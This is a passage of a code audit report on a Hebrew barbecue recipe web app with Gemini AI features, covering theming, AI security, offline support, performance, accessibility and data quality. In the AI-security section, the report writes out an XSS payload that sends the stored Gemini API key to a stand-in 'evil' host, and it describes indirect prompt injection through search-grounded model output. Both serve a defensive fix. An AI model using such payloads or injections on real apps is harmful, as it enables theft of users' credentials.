- **Evidence:** `.fold-corner{right:0}` (412, dead); `.seasoning-chip`/`.itemdesc`/`.vc-det`/`.wp-row` use `border-right` as leading accent (1049, 1115, 1125, 1159, 1161); print `.wp-row::before{margin-left:6px}` (1200).
- **Why it matters:** Works today only because the app is RTL-locked; any LTR/bilingual layout flips accents to the wrong edge (interacts with §9 i18n).
- **Recommendation:** Use `border-inline-start`/`margin-inline-start`.
- **Effort:** S

### [P3] 13 — Hard-coded semantic accent hues don't adapt per theme
- **Evidence:** `.wp-row.wp-*`/`.wp-bar-*` (1161, 1178) fixed hues, `.tl-badge`/`.tl-pantrybtn` `#c89650` (1218, 1223), `ktag/gtag/kbox` rgba tints (815–836) — chosen for light cream; some drop contrast in charcoal.
- **Recommendation:** Promote the process-stage palette to per-theme tokens (`--stage-sv`, `--stage-smoke`…).
- **Effort:** M

### [P3] 14 — `!important` count (45) and single responsive breakpoint
- **Evidence:** 45 `!important`, concentrated in `@media print` (1268–1302) and dead theme blocks; a few live (`body` bg 157, `.mreset` 985–986). Only one non-print breakpoint: `@media(max-width:560px)` (1304); desktop relies on the fluid `minmax(248px)` grid + `max-width:1180px`.
- **Recommendation:** After #5, audit remaining live `!important`; optionally add a `min-width:900px` breakpoint for desktop.
- **Effort:** S (audit) / M (breakpoint)

**UI Top 3:** ① Tokenize hard-coded light backgrounds (#1) + dark text (#2) — makes charcoal usable. ② Fix `--fscale` leakage (#3). ③ Delete ~75 lines of dead theme CSS + `.fold-corner` (#5).

---

## §4 · AI layer & security (BYOK-Gemini, 7 capabilities + bilingual voice)

*Well-built foundation: every capability has a deterministic local fallback + `aiAvail()` gate; grounded keys hard-validated against the live catalog; the recipe generator takes salt/cure/temp from an app-side `UMAKE_CALC` table (never the model); the scheduler recomputes `startBy` in-app and ignores AI dates; JSON forced via `responseMimeType`+fence-stripping; `__aiMock` seams make it testable. The problems are in the edges.*

### [P0] 1 — Unescaped AI text rendered as HTML across every AI surface → XSS → Gemini API-key theft
- **Evidence:** No HTML-escape helper exists anywhere (grep `esc`/`escHtml`/`escapeHtml` → nothing). AI strings interpolate straight into `innerHTML`: Ask answer `(r.txt||'').replace(/\n/g,'<br>')` (4426); voice Q&A `${vcLastQA.a}` (4979); `evPlanPreviewHTML` rationale (6486); `diagnoseRender` diagnosis/causes/fixes (6642–6644); `journalInsightsRender` (6807–6809); `seasonRecRender` reason (6570); `wcimRowHTML` note (6348). Key is plaintext `store.get('mk-gemkey')` (2110–2113, 4871). The two conversational paths (`askGemini` 4283, `vcAskAI` 5099) attach `google_search` grounding, so external web content enters model output (indirect prompt injection).
- **Why it matters:** A reply containing `<img src=x onerror=fetch('//evil/?k='+localStorage['mk-gemkey'])>` executes on render and exfiltrates the API key. Even absent an attacker, spontaneous markup corrupts the panel. Single highest-severity issue in the layer.
- **Recommendation:** Add one `esc(s)` helper (`&<>"'`→entities) and wrap **every** interpolated AI string at the sites above. For free-text answers, escape first, then `\n`→`<br>`. Don't rely on the model to not emit HTML.
- **Effort:** M

### [P1] 2 — No request timeout / cancellation — AI calls can hang the UI forever
- **Evidence:** Every `fetch` (aiJSON `callOnce` 4344–4347; `askGemini` 4286; `vcAskAI` 5101; `vcTranslateToEn` 5037; `gemSpeak`) is bare with no `AbortController`. Loaders (`✨ מחשב עם AI…` 6375, `✨ בונה תפריט…` 6505) have no clearing timeout.
- **Why it matters:** On flaky mobile a stalled request leaves the spinner spinning with no cancel and no fallback trigger — graceful degradation silently fails exactly when needed.
- **Recommendation:** `AbortController` + ~20s timeout in `aiJSON`/`askGemini`/`vcAskAI`; on abort reject so the existing `catch` fallbacks fire; add a cancel affordance to long panels.
- **Effort:** S–M

### [P1] 3 — Retry logic is inverted and has no backoff
- **Evidence:** `aiJSON` (4355–4356): `catch(e){ if(startsWith('api-4')||startsWith('empty-')) retry once; else throw }`.
- **Why it matters:** It retries 4xx — including 400 (will fail again), 403 (bad key), 429 (quota) — the non-recoverable/rate-limited cases, immediately (a second 429 burns quota). Genuinely transient failures (5xx, network, timeout) hit `else throw` and are not retried.
- **Recommendation:** Retry on 5xx/network/timeout with short backoff; don't blind-retry 400/403; on 429 back off (respect `Retry-After`) or fail straight to local.
- **Effort:** S

### [P1] 4 — "Never invent safety numbers" (PRD P3) is enforced only for the structured calc, not AI prose
- **Evidence:** Recipe generator guarantees the calc block (`calc:Object.assign({},UMAKE_CALC[v.type])` 6717 + app note 6718 + `⚠ לא-מאומת בטיחות` badge 6729), but free-text `phases`/`materials` (validated only for shape in `umakeValidateStructure` 6692–6707) are inserted verbatim — nothing stops a phase reading "add 2.5 g cure #1 per kg." Same in `aiDiagnose`: prompt says "אל תמציא מספרי טמפ׳/בטיחות" (6625) but `diagnosis`/`causes`/`fixes` are free prose (6631–6632). `askGemini`/`vcAskAI` answers are entirely free text with only a soft prompt guard (4276, 5079/5085).
- **Why it matters:** The guarantee covers numbers the app *computes*, not numbers the model *narrates*. A user can be handed a fabricated cure/temp inside otherwise-trusted AI text — genuine food-safety exposure. (This is theme **T1** on the AI side.)
- **Recommendation:** In `umakeValidateStructure`/`aiDiagnose`, run a numeric-unit detector over prose (`/\d+\s?(°|מעלות|ppm|גרם|g|%)/`) and strip/redact or flag those spans with an inline "verify against app calculator." Keep the warning badge.
- **Effort:** M

### [P2] 5 — Prompt injection via string concatenation + `google_search` indirect injection
- **Evidence:** User free text is concatenated into task strings in quotes: `'…לפי הבקשה: "'+prompt+'"'` (`aiPlanEvent` 6464, `aiGenerateRecipe` 6712), and pasted into `askGemini`/`vcAskAI` which enable `google_search`.
- **Why it matters:** Structured outputs are well-protected — invalid keys dropped, kosher intent re-derived by regex (`/כשר|בלי חזיר|ללא חזיר/` 6466), so a jailbreak can't smuggle pork/off-catalog items. Residual risk: (a) the prose fields (feeds #1/#4) and (b) web-search steering the free-text answers. Since it's the user's own key, the real payload is the XSS in #1.
- **Recommendation:** Structurally separate instruction from data (user text in its own labeled `contents` part, not in the task sentence); keep the kosher-regex defense; treat #1's escaping as primary.
- **Effort:** M

### [P2] 6 — No in-flight guard, dedup, or cache → double-taps fire duplicate paid/quota calls
- **Evidence:** `evPlanRun` (6503), `runDiagnose` (6650), `runGenerateRecipe` (6735), `openWhatCanIMake` (6371) don't disable their trigger or guard re-entry. `aiJSON` has no cache — contrast the TTS path which caches (`gemCache` 4869/4889).
- **Why it matters:** Every extra tap is another billable/quota call; a second submit races two panels. On the paid TTS model this costs money.
- **Recommendation:** Disable the CTA + set `_aiBusy` while outstanding; add a tiny LRU keyed on `task+grounding` (mirroring `gemCache`) with short TTL for idempotent capabilities.
- **Effort:** S

### [P2] 7 — Journal insights + conversational Q&A grounding is prompt-only and unvalidatable
- **Evidence:** `journalInsightsGrounding` appends "אל תמציא בישולים…" (6790) but `summary`/`patterns`/`suggestions` are free text with nothing to validate against (6797–6799). `askGemini`/`vcAskAI` fully open.
- **Why it matters:** Unlike the key-validated capabilities, these can hallucinate cooks/history/advice with no backstop; no user-facing signal that they're *not* grounded like the others.
- **Recommendation:** Keep the "מבוסס על היומן שלך בלבד" badge + add a light "AI may be inaccurate — verify" disclaimer on the two open surfaces.
- **Effort:** S

### [P3] 8 — `gemini-2.5-flash` and endpoint hardcoded in 6 places
- **Evidence:** Model+URL literal in `askGemini` (4286), `askValidateKey` (4296), `aiJSON` (4345), `vcTranslateToEn` (5037), `vcAskAI` (5101), + TTS model.
- **Recommendation:** Extract `GEM_MODEL`/`GEM_URL(model)` constants; pin/upgrade in one place.
- **Effort:** S

### [P3] 9 — API key passed as URL query param, not header
- **Evidence:** `…:generateContent?key=${encodeURIComponent(key)}` at every call site (4286, 4345, 5101…).
- **Why it matters:** Query-param secrets are more log/Referer-leak prone than headers.
- **Recommendation:** Send `x-goog-api-key: <key>` header instead of `?key=`.
- **Effort:** S

### [P3] 10 — AI mode auto-enables whenever any key exists — even a TTS-only key
- **Evidence:** `askMode()` returns `gemKey()?true:false` by default (4260); the same `mk-gemkey` powers TTS.
- **Recommendation:** Default `mk-askai` independently of key presence, or prompt once on first AI use.
- **Effort:** S

### [P3] 11 — `aiValidateKeys` silently drops everything if `cwAllItems` is unavailable
- **Evidence:** `const valid = (typeof cwAllItems==='function') ? … : new Set()` (4363) — empty set ⇒ all keys dropped, only a `console.warn`.
- **Why it matters:** Fails closed (good) but a load-order regression makes every AI capability silently return nothing with no user-visible reason.
- **Recommendation:** If the catalog set is empty, throw/surface a distinct "catalog not ready" state.
- **Effort:** S

**AI Top 3:** ① Escape all AI output before `innerHTML` (#1) — closes XSS-to-key-theft. ② Add `AbortController` timeouts + fix the inverted retry (#2 & #3). ③ Extend the safety-number guarantee to AI prose (#4).

---

## §5 · PWA / offline / persistence / deploy

*No P0 (functions online). Positive baseline: journal photos downscaled to 360px JPEG q0.6 with a quota-aware fallback (3760–3772); wipe snapshots for undo (5557, 5565).*

### [P1] 1 — No service worker — zero offline capability
- **Evidence:** Grep `serviceWorker`/`caches`/`workbox`/`.register(` → nothing; no `sw.js` emitted by the dist step (7494–7508).
- **Why it matters:** This is the "phone propped by the smoker" app. With no signal the browser must serve `index.html` from cache — nothing guarantees that. No offline shell → a cold load / cache miss shows the browser error page. All user data is local, yet the app that reads it isn't.
- **Recommendation:** Emit `sw.js` from build.py into `dist/`, register in the head (~120). Precache `./`, `index.html`, `manifest.webmanifest`, `icon-192/512.png`, self-hosted fonts. Cache-first shell, network-first/SWR for the HTML, cache name keyed on build version (1492) so each build invalidates; `skipWaiting`/`clients.claim` + an in-app "new version — refresh" toast.
- **Effort:** M

### [P1] 2 — Eight Google Font families load render-blocking from a CDN
- **Evidence:** `index.html:129–131` — `preconnect` to Google + one render-blocking `<link rel="stylesheet">` for 8 families (Suez One, Frank Ruhl Libre 3wght, Assistant 5, Heebo 3, Rubik 4, Alef 2, David Libre 3, Secular One). Defaults use only two: `--font-body:'Heebo'`, `--font-display:'Suez One'` (153–154); the rest are `mk-fontpair` alternatives.
- **Why it matters:** Even with a SW, cross-origin CDN fonts won't be same-origin precached → FOUT offline. Online it's a large render-blocking request to two extra origins on every cold load (heavy Hebrew subsets), plus a third-party privacy leak.
- **Recommendation:** Self-host as `woff2` under `dist/fonts/` with local `@font-face`, precache in the SW, load only the active pair by default, lazy-load alternates on `mk-fontpair` change; drop the preconnects + Google `<link>`.
- **Effort:** M (S if trimmed to Heebo + Suez One)

### [P1] 3 — Manifest/meta `theme_color` is dark charcoal but the app is light cream
- **Evidence:** `manifest.webmanifest:11–12` `background_color`/`theme_color` = `#16110d` (near-black); `build.py:121` `<meta name="theme-color" content="#16110d">`. Actual default is cream (`--bg2:#faecd8`, 149/157; default `mk-theme=cream` 5635). The meta is static, never updated on theme switch.
- **Why it matters:** On install, Android's splash paints `#16110d` behind the icon and the status bar tints near-black, then the app opens bright cream — a jarring flash and mismatched chrome at the install moment.
- **Recommendation:** Set `background_color`/`theme_color` (manifest + meta) to the cream base; update the `<meta>` dynamically on theme change so the toolbar tint tracks the active palette.
- **Effort:** S

### [P1] 4 — `store.set` swallows quota errors silently — data loss with no warning
- **Evidence:** `build.py:2112` `set(k,v){try{localStorage.setItem(k,JSON.stringify(v))}catch(e){}}`. Empty catch discards `QuotaExceededError`. Only the journal-photo path handles quota (3760–3761, toast + photo drop). Every other write (favorites, notes, ratings, inventory, menu, timeline) fails invisibly once storage is full.
- **Why it matters:** A user with journal photos (base64 JPEGs, 3771) can silently cross the ~5 MB quota; from then on new favorites/notes/plans appear to save but are gone on reload. Worst kind of data loss. (Theme **T3**.)
- **Recommendation:** Make `store.set` return success/failure and surface one global toast on quota failure (mirror journal); proactively `navigator.storage.estimate()` to warn near quota and prompt an export.
- **Effort:** S

### [P2] 5 — No `_headers` file — stale `index.html` risk and no SW update lever
- **Evidence:** No `_headers`/`_redirects` in `site/` or `dist/`; the dist step copies only index.html + icons + manifest + product.html. Deploy is a single unhashed `index.html`.
- **Why it matters:** One 1.5 MB `index.html` with no content hash; a caching browser/intermediary can pin users to an old build. Cloudflare revalidates HTML by default, but there's no explicit contract, and once a SW exists cache control becomes essential to avoid "stuck on old version."
- **Recommendation:** Emit `dist/_headers`: `Cache-Control: no-cache` (or `max-age=0, must-revalidate`) for `/index.html` + `/manifest.webmanifest`; long-lived `immutable` for icons + fonts.
- **Effort:** S

### [P2] 6 — Import is destructive, unvalidated, and leaves stale keys
- **Evidence:** `importData` (5488–5503) accepts `o.data` or the raw object then blindly `setItem(k,v)` for every entry. Ignores the `app:'matkonet'` tag + `ver:1` from export (5482), no schema/version check, no merge-vs-replace, never clears keys absent from the backup. Only confirmation is a one-line note (5540).
- **Why it matters:** Restoring an older/newer schema imports raw values with no migration; leftover keys linger and conflict; a mistaken import silently overwrites live data with no undo (unlike wipe, which snapshots 5557/5565).
- **Recommendation:** Validate `o.app==='matkonet'`, branch on `o.ver` (run migrations); snapshot before applying (reuse wipe undo); optionally wipe-then-restore; add a confirm step.
- **Effort:** M

### [P2] 7 — Migrations are ad-hoc and fragmented — no central schema version
- **Evidence:** Three unrelated mechanisms: boolean `mk-seas-migrated` scanning all keys (7461–7478), versioned `mk-inv-ver`/`INV_VER=2` (6255–6270), inline theme-name rewrite in `themeKey()` (5635). No single `mk-schema` gating an ordered migration list.
- **Why it matters:** Each schema change needs a new bespoke flag; easy to forget; export/import has no version to migrate against. Debt compounds each release.
- **Recommendation:** A single integer `mk-schema` + a migration runner applying ordered steps once at boot (folding in the three existing); stamp `mk-schema` into the export payload.
- **Effort:** M

### [P2] 8 — Backup is manual-only with no safety net against browser eviction
- **Evidence:** Export/import live in the tools hub + settings (4059, 5588, 7427) — discoverable — with a per-origin warning (README.txt:18–20). But no auto-backup, no reminder, no persistent-storage request. localStorage is evictable under pressure.
- **Why it matters:** All favorites/journal(+photos)/inventory/notes/plans live only in one browser's localStorage. A cache clear, "clear site data," iOS 7-day eviction, or storage pressure wipes everything; most users never export.
- **Recommendation:** `navigator.storage.persist()` at first meaningful write (S, high value); a soft "you haven't backed up in N days" nudge; consider an auto-export prompt after milestones.
- **Effort:** M (the `persist()` call alone is S)

### [P2] 9 — Manifest description is stale (137 recipes vs 279 catalog items)
- **Evidence:** `manifest.webmanifest:4` "…137 מתכונים ו-13 כלים"; catalog is 279 items and the tools grid lists far more than 13.
- **Recommendation:** Update the description; better, generate the manifest from build.py so counts stay in sync.
- **Effort:** S

### [P3] 10 — Maskable icon reuses the non-padded 512 — likely cropped on Android
- **Evidence:** `manifest.webmanifest:26–31` declares `icon-512.png` `purpose:"maskable"` — the same file as `purpose:"any"` (20–25). Maskable needs ~20% safe-zone padding.
- **Recommendation:** Ship a dedicated maskable PNG with safe-zone padding (verify at maskable.app).
- **Effort:** S

### [P3] 11 — Manifest lacks `shortcuts` and `screenshots`
- **Evidence:** Required fields present but no `shortcuts` (long-press actions) or `screenshots` (richer install UI); `apple-touch-icon` uses 192 (127) where Apple's canonical is 180.
- **Recommendation:** Add 2–3 `shortcuts` (New event / Shopping list / Journal), a couple of `screenshots`, a 180×180 apple-touch-icon.
- **Effort:** S

**PWA Top 3:** ① Service worker + self-hosted fonts (#1+#2) — delivers the offline milestone. ② Persistence robustness (#4+#8) — `persist()`, surface quota failures, storage-estimate nudge. ③ Deploy/PWA quick wins (#3+#5) — fix `theme_color`, emit `_headers`.

---

## §6 · Performance & loading

*Honesty note: Cloudflare serves the HTML brotli/gzip. `index.html` is **1,505,949 B raw but ~337 KB gzipped** (measured) — so "1.5 MB" is a **parse/main-thread** problem, not bandwidth. Breakdown: `<script>` 1,372,033 B (91%) → of which `const DATA={…}` 887,673 B (58.9%); `<style>` 111,517 B; markup ~22 K. DATA composition: makes 297,950 · cuts 273,485 · seasonings 200,822 (37.7 KB gz) · builds 54,706 · specials 44,440 · glossary 12,061 · houseRub 4,118. The `src` citations on 279 items total 251,338 B raw / 49 KB gz = 28% of DATA. No strict runtime-P0; closest is the missing SW (P1).*

### [P1] 1 — No service worker — the "PWA" is not offline-capable and re-validates 1.5 MB every visit
- **Evidence:** Zero matches for `serviceWorker`/`register(`/`caches.`; no `sw.js`; no `_headers`, so Cloudflare serves HTML with default `must-revalidate`.
- **Why it matters:** For a local-first grill/smoker app there's no offline shell; every cold navigation re-fetches/re-validates the whole document, and the Google-Fonts `<link>` fails with no cache fallback.
- **Recommendation:** Minimal SW precaching `index.html` + icons + (ideally self-hosted) font woff2s, cache-first; register after load; SWR on the HTML for instant repeat loads + offline.
- **Effort:** M

### [P1] 2 — 888 KB `DATA` parsed as a raw object literal, not `JSON.parse` — slowest possible cold parse
- **Evidence:** `build.py:1499` `const DATA = __DATA__;`; `build.py:7485` `HTML.replace("__DATA__", DATA_JSON)` with `DATA_JSON=json.dumps(payload,…)` (112). Result is a bare JS object literal parsed as source on the main thread.
- **Why it matters:** For blobs >~10 KB, `JSON.parse('…')` is ~1.5–2× faster than an equivalent object literal (simpler grammar). At 888 KB this is tens of ms of main-thread block on mobile before render — free to recover. (Theme **T3**.)
- **Recommendation:** Emit `const DATA = JSON.parse(<single-quoted, backslash-escaped JSON string>);` (i.e. `json.dumps(DATA_JSON)` as a JS string literal). One-line build change, measurable TBT win.
- **Effort:** S

### [P1] 3 — Citation `src` fields (251 KB raw / 49 KB gz) inlined into the initial payload but only shown on item-open
- **Evidence:** `build.py:84–99` merges `CUT_SOURCES/SPEC_SOURCES/MAKE_SOURCES` onto every item as `src`. Measured 251,338 B raw / 49,233 B gz — 28% of DATA and ~15% of the entire gzipped transfer. `src` is never touched by `cutCard`/`specCard`/`makeCard`/`render()`; read only inside the detail panel.
- **Why it matters:** The largest chunk of "pay now, use maybe-later" data — most sessions open a handful of items yet every session parses all 279 items' citations at startup.
- **Recommendation:** Split `src` into a lazy payload — a second `<script type="application/json" id="srcs">` parsed on first panel-open, or (with a SW) a `sources.json` fetched on demand.
- **Effort:** M

### [P1] 4 — Every keystroke re-renders up to 279 cards via `innerHTML`, with a `localStorage` read per card, no debounce
- **Evidence:** `build.py:3222` `#q` input → `catView()` (2461) → `render()` (2305), which rebuilds three grids via `innerHTML=cuts.map(cutCard).join("")` (2315), `#makeGrid` (2323), `#specGrid` (2333) — no virtualization/fragment/diffing. Each card calls `ratingMini(key)` (3250) = `store.get('rating:'+key)` = sync `getItem`+`JSON.parse` per card, plus `kosherTag`→`kosherStatus` (3271) = `resolveItem` + several regexes per card.
- **Why it matters:** A one-char search rebuilds the full set and issues ~279 sync `localStorage` reads + ~279 regex passes per keystroke on the main thread — easily 50–150 ms/keystroke on mobile Safari → visible jank. (Theme **T3**.)
- **Recommendation:** (a) Debounce ~120 ms. (b) Load all ratings once into a Map (like `favs` at 3245). (c) Memoize `kosherStatus(key)` in a cache (static inputs). Optionally batch the three `innerHTML` writes.
- **Effort:** S (debounce + ratings map) / M (full)

### [P2] 5 — Render-blocking Google-Fonts `<link>` loads 8 families when 2 are active; font vars have no fallback
- **Evidence:** `index.html:131` one render-blocking `<link>` for 8 families/many weights; defaults use only Heebo + Suez One (153–154); others exist for `FONT_PAIRS` (5627–5631) + the light/vintage theme. Font vars declared with no generic fallback (`'Heebo'` not `'Heebo',sans-serif`).
- **Why it matters:** Render-blocking request for ~20 Hebrew font files delays first paint; 6/8 families are dead weight by default; no fallback → undefined default offline. (Overlaps PWA #2.)
- **Recommendation:** Load only Heebo + Suez One in the blocking `<link>`; inject the extra pair's `<link>` lazily in `setFontPair()` (5651); add `,sans-serif`/`,serif` to the vars; ideally self-host (pairs with the SW).
- **Effort:** S

### [P2] 6 — 301 seasonings (200 KB / 38 KB gz) inlined but only used in the seasoning browser / wizard
- **Evidence:** `payload["seasonings"]` (109). `DATA.seasonings` referenced only in picker/wizard paths (1787, 1811, 1960, 1975, 2791, 3989) — never in `render()`.
- **Why it matters:** ~23% of DATA is feature-specific data most catalog-only sessions never open, yet parsed at cold start.
- **Recommendation:** Move `seasonings` (+`houseRub`) to a lazily-parsed `<script type="application/json">` loaded on first picker open (same pattern as #3).
- **Effort:** M

### [P2] 7 — `menuState()` re-parses the full menu from `localStorage` on all 41 call sites, unmemoized
- **Evidence:** `build.py:4652` `menuState(){return store.get(menuKey())||{…}}` — full `getItem`+`JSON.parse` each call; 41 sites; several call it twice in a row (2122/2125; `evMenu*` 6079–6130).
- **Recommendation:** Cache the parsed menu in a module var, invalidated on menu-key writes.
- **Effort:** S

### [P2] 8 — No `_headers` / Cache-Control for the static shell
- **Evidence:** No `_headers`; `wrangler.toml` only sets `pages_build_output_dir`.
- **Recommendation:** `dist/_headers`: `immutable, max-age=31536000` for icons/fonts; short SWR for the HTML (with the SW in #1).
- **Effort:** S

### [P3] 9 — `store` does `JSON.parse`/`stringify` on every access (62 get / 80 set sites)
- **Evidence:** `build.py:2110–2113`; re-serializes even tiny scalars (ratings, done flags).
- **Recommendation:** Tiny in-memory write-through cache in `store` keyed by key (justified by #4/#7).
- **Effort:** S

### [P3] 10 — `kosherStatus` recomputes regex classification per card every render
- **Evidence:** `build.py:3271–3288` runs `resolveItem` + ~6 regex tests; called from `kosherTag` (3290) + `isKosherOk` (3292) inside card builders + `passFilters`. Inputs static per item.
- **Recommendation:** Memoize by key into a `{}` cache (values change only via static `KOSHER_OVERRIDE`).
- **Effort:** S

### [P3] 11 — Repo carries a 1.35 MB unreferenced JS dump + duplicate archives (build hygiene)
- **Evidence:** `_app_check.js` 1,378,016 B (≈ the inline script) with 0 references; plus `files.zip` (639 KB) and `matkonet-claudecode-handoff.zip` (636 KB) at root. Not shipped in `dist/`.
- **Recommendation:** Delete `_app_check.js` + the zips (or move to `.gitignore`d scratch).
- **Effort:** S

**Positive (no action):** card interactions use a single delegated document listener (3190–3198, `closest('.card')`) so re-renders don't leak listeners; timeline timers cleared before re-arming (5238). Over-the-wire is ~337 KB gz, not 1.5 MB.

**Perf Top 3:** ① Wrap `DATA` in `JSON.parse('…')` (#2, S). ② Debounce search + ratings Map + memoize `kosherStatus` (#4). ③ Ship a service worker (#1). *Bigger swing: deferring #3 (citations) + #6 (seasonings) moves ~26% of the parsed payload off cold start.*

---

## §7 · Accessibility

*RTL is genuinely solid (`<html lang="he" dir="rtl">` 115, logical `inset-inline-*` throughout) and reduced-motion is correct (1309). But the keyboard-nav and WCAG-AA claims are substantially false: primary surfaces are non-focusable and the default theme fails AA on most accent text.*

### [P0] 1 — The core UI is keyboard-inoperable — cards, home paths, and all wizard selectors are non-focusable divs/spans
- **Evidence:** Catalog items are `<article class="card" data-n=…>` with no `tabindex`/`role`/`href` (2206, 2235, 2249), opened purely via `document.addEventListener("click", … closest(".card"))` (3190–3195) — **no `keydown` handler**. Home flow cards are `<div class="cpath" data-cgo=…>` (1336–1338). Every wizard selector is a `<span class="cmethod">`/`<span class="chip">`: appetite/kosher (1361–1363), methods (5880), sides/drinks/desserts (5956, 5967, 5980), filter & seasoning chips (1991–1994, 2426–2427), burger customizer (7186). None have `tabindex`/`role`/keyboard handlers. (The `<button class="cattile">` tiles at 2448 and real `<button>`s in panels are the only keyboard-reachable controls.)
- **Why it matters:** A keyboard-only or switch-access user cannot open a single recipe, navigate the three home paths, or make any choice in the wizard, filter, or burger builder. This is the entire product.
- **Recommendation:** Render these as real `<button>` (preferred) or add `role="button" tabindex="0"` + a shared keydown handler on Enter/Space. Simplest central fix: at the delegated click listener (3190) add a sibling `keydown` listener calling the same logic for `[data-cgo],[data-cwm],[data-app],.chip,.card`, and add `tabindex="0"` to those templates.
- **Effort:** L

### [P1] 2 — Default "Warm Cream" theme fails WCAG AA on most accent text
- **Evidence (measured ratios):** `--ember2 #f4a261` category label on card bg = **1.92:1** — the uppercase category label on *every* card (`.card .cat` 581, rendered 2210/2239/2253) + `.kick`/`.chome-kick`. `--ember #e76f51` as UI text = **2.88:1** (`.cmethod.on`, `.cev-act`, `.cinv-grp`, `.cnav button.on`, `.chome-caps`). `--fresh #1a9a7a` on `--fresh-l #d8f0e8` = **2.95:1** (`.cbadge`, `.ptag` "🌿 הכי פופולרי" 1336, `.proj-banner b`, `.cwsel-title`). `.saved` inline `color:#8fce76` on card = **1.80:1** cream / 1.56 walnut (every CUT card 2220). Other themes mostly pass (charcoal excellent; walnut/slate fail only `ember2` small-label at 3.05:1). The **default** is worst.
- **Why it matters:** The category label and "most popular" tag are primary wayfinding text and fail AA badly out of the box — contradicting the AA claim. (Theme **T5**.)
- **Recommendation:** Use `--bone`/`--ash` (both pass) for small text instead of `--ember2`; darken cream `--ember` to ~`#c85a3c` for text roles; replace `.saved` `#8fce76` with `--fresh`/`--good` (or ~`#3f7d2f`); use a darker fresh for badge text on `--fresh-l`.
- **Effort:** M

### [P1] 3 — Cooking timers have no accessible name, no live announcement, and play no sound
- **Evidence:** `timerHTML` (2865–2870) emits `<button data-play>▶</button>` and `<button class="rst" data-reset>↻</button>` — icon-only, no `aria-label`. The countdown `.tt` updates each second (2901) with no `aria-live`; on completion it only adds `.ringing` + text "סיום!", and the "alarm" is `try{new AudioContext();}catch(e){}` (2903) which constructs a context but **produces no sound**.
- **Why it matters:** A blind cook gets no spoken timer state and no audible alarm; the alarm is inaudible to *everyone*. SRs announce the play button as "▶ / black right-pointing triangle."
- **Recommendation:** Add `aria-label="הפעל טיימר"/"אפס"` (toggle on play/pause); wrap in `role="timer"`; on completion move "סיום!" into a `role="alert"`/`aria-live="assertive"` node and actually play a tone via an oscillator.
- **Effort:** S

### [P2] 4 — Toggle controls expose no pressed/selected state to assistive tech
- **Evidence:** Selected state is only an `.on` CSS class with no `aria-pressed`/`aria-selected`: `.chip.on` (all filters), `.cmethod.on` (all wizard selections), the kosher toggle `data-on="0"` (1363), `.vc-langbtn.on` (4970–4974), `.tab` panel tabs (2784), `.tl-alerts.on`. Only `favStar` does it right (`aria-pressed` 3249).
- **Why it matters:** A SR user cannot tell which method/filter/language is selected — the whole wizard state is invisible to AT.
- **Recommendation:** Add `aria-pressed="${on}"` to chips/methods/lang buttons; `role="tab"`+`aria-selected` (or `aria-pressed`) to panel tabs, mirroring favStar.
- **Effort:** M

### [P2] 5 — Icon-only navigation and stepper buttons lack labels
- **Evidence:** Back buttons are bare arrows with no `aria-label`: `<button class="back" id="cwBack">→</button>` (1347), screen back buttons (1471, 1478). Stepper `<button>−</button>`/`<button>+</button>` (1359, 7336, 7344) and `.cinv-qty` `−/+` (6885) are unlabeled, and their value (`#cServVal`, `#pwwv`) is not in a live region so the new count is never announced. (Contrast: the corner back-button in `showPanel` does it right — text + `aria-label` 2994–2995.)
- **Recommendation:** Add `aria-label` ("חזרה", "הוסף סועד", "הפחת"); give the stepper value `aria-live="polite"` or `role="spinbutton"`.
- **Effort:** S

### [P2] 6 — Dynamic content changes are not announced (no status live region)
- **Evidence:** The only live region is the toast (`role="status" aria-live="polite"` 3216). AI flows swap the panel from loading ("✨ בונה תפריט…" 6505) to results by re-calling `showPanel`, which refocuses `.x` (3006) but doesn't announce results. The wizard step counter "שלב 1/6" (`#cwLbl` 1347) and voice-cook "משימה X מתוך Y" (4949) update silently.
- **Recommendation:** Add a visually-hidden `aria-live="polite"` region; push step-change/result-ready text to it.
- **Effort:** M

### [P2] 7 — Form labels are frequently not programmatically associated
- **Evidence:** (a) sibling labels — `<label>text</label><input>` with no `for`/wrapping: 2493, 2560–2562, 4746–4750, 1354–1356, 5183, 6417; (b) placeholder-only inputs with no label: catalog search `#q` (1427), `seasQ` (1990), `askq` (4406), `vcAskInput` (4978), AI textareas `evpPrompt`/`diagPrompt`/`genPrompt` (6529/6663/6772). (Project/journal/pantry forms do wrap correctly, e.g. 3648, 3727.)
- **Recommendation:** Wrap inputs in their `<label>` or add `for=`/`id=` pairs; give placeholder-only search/AI fields an `aria-label`.
- **Effort:** M

### [P2] 8 — Heading hierarchy skips levels
- **Evidence:** Panels use `<h2>` title then jump to `<h4>`, skipping h3: calculators (2584→2492/2559), item panels (2670→2697/2708); seasoning detail `h3`→`h5` skipping h4 (1817→1818). Two `<h1>` exist (1316, 1326).
- **Recommendation:** Make in-panel section headings `<h3>`, seasoning sub-headings `<h4>`; keep a single `<h1>` per screen.
- **Effort:** S

### [P3] 9 — Tap targets below the claimed 44px
- **Evidence:** `.x` close 38×38 (618), `.favstar` 30×30 (810), `.cseas-pick` 30×30 (257), `.cinv-qty button` 26×26 (335), `.timer button` 30×30 (655), `.md-act button` 34×34 (1252), `.capp-ico` 40×40 (179). Clear WCAG 2.2 AA (24px) but miss the app's own 44px goal.
- **Recommendation:** Bump to `min-width/height:44px` (or invisible padding hit-area) for close/favorite/quantity controls.
- **Effort:** S

### [P3] 10 — No skip-link; focus lost on in-place re-renders; unlabeled directional arrows in RTL
- **Evidence:** No skip-to-content link (WCAG 2.4.1) despite a persistent bottom `.cnav`. Panels that re-render via `host.innerHTML` without `showPanel` drop focus to `<body>`: `vcRender` (4945), seasoning/`spk` rerenders (1928+), tab switches (2784). (Focus-trap itself is well built 3202–3211; focus restore on close works via `lastFocus` 2986/3046.)
- **Recommendation:** Add a visually-hidden skip link; after in-place re-renders restore focus to a stable anchor; label the arrow buttons.
- **Effort:** M

**A11y Top 3:** ① Make cards, home paths, and wizard chips keyboard-operable (#1). ② Fix default-theme AA contrast (#2). ③ Timers: label buttons, announce completion, emit real audio (#3).

---

## §8 · Content & data quality

*Verified counts: CUTS 130 · SPECIALS 47 · MAKES 102 = 279 ✓; seasonings 301; GLOSSARY 52. The catalog is broad and mostly well-authored; the biggest problems are a safety-critical calculator field broken on ~half the charcuterie, and cross-file duplication/typos that leak to the UI because dedup runs one direction.*

### [P0] 1 — `calc.cure` renders "Cure #2.5" and suppresses the safety warning on 47 cured makes
